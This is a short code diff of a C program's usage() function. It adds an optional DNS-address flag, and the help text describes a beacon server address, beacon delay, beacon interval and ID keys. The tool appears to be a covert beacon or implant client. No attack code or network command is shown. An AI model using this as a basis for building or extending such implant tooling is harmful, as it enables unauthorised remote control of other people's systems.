@@ -113,7 +113,7 @@ int usage(char **argv)
 {
 	printf("\n");
 	fprintf(stdout, "  %sUsage:%s\n", BLUE, RESET);
-	fprintf(stdout, "  %s -a address [-d b_delay] [-i interval] (-k idKey | -K idKeyFile) [-I interface] [-p port] [-t t_delay] [-m OS] \n\n", *argv);
+	fprintf(stdout, "  %s [-a <address>] [-d <b_delay>] [-i <interval>] (-k <idKey> | -K <idKeyFile>) [-S <DNS address>] [-p <port>] [-t <t_delay>] [-m <OS>] \n\n", *argv);
 	fprintf(stdout, "    %s-a <address>%s       - IP address or hostname of beacon server\n", GREEN, RESET);
 	fprintf(stdout, "    %s-d <b_delay>%s       - initial delay before first beacon (in seconds), 0 for no beacons.\n", GREEN, RESET);
 	fprintf(stdout, "    %s-i <interval>%s      - beacon interval (in seconds)\n", GREEN, RESET);
